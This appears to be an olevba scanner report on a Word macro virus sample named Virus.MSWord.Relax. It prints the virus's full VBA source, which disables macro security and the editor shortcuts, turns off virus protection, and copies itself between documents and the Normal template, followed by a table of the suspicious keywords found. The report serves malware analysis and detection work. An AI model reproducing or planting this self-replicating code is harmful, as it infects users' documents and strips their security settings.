olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Relax
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Relax - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Baby[Bench] v2.0
Private CountChar_1 As Integer: Private CountChar_2 As Integer
Private Sub Document_Open()
On Error Resume Next
CountChar_1 = ActiveDocument.Characters.Count
Application.Options.ConfirmConversions = False: Application.EnableCancelKey = wdCancelDisabled
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
CommandBars("Tools").Controls("Macro").Enabled = False
If Application.Version = 9# Then: CommandBars("Macro").Controls("Security...").Enabled = 0
If Application.Version = 8# Then
    With Application.Options: .VirusProtection = False: .SaveNormalPrompt = False: End With
End If
If MacroContainer = NormalTemplate Then Set Host = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule Else Set Host = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If MacroContainer = ActiveDocument Then Set Carrier = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule Else Set Carrier = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Open "c:\WinIO.dll" For Output As 1
For x = 1 To Carrier.CountOfLines: Line = Carrier.Lines(x, 1): Print #1, Line: Next x
Close 1
With Host: .Deletelines 1, .CountOfLines: .AddFromFile ("c:\WinIO.dll"): End With
Kill ("c:\WinIO.dll")
If Hour(Now) = 8 And Minute(Now) = 45 Then
   With Assistant.NewBalloon
       .Icon = msoIconAlert
       .Heading = "Baby[Bench] Millenium"
       .Text = "Phew! I'm just about beat." & vbCr & "It's been a long day! You gotta relax sometime!" & vbCr & vbCr & "Wow! Everything's blurry!"
       .Show
   End With
   ActiveDocument.Content.Font.Animation = wdAnimationShimmer
End If
End Sub
Private Sub Document_Close()
On Error Resume Next
CountChar_2 = ActiveDocument.Characters.Count
If Left$(ActiveDocument.Name, 8) = "Document" And CountChar_2 = 0 And CountChar_1 = 0 Then
ActiveDocument.Saved = True
ElseIf CountChar_1 = CountChar_2 Then ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |WinIO.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

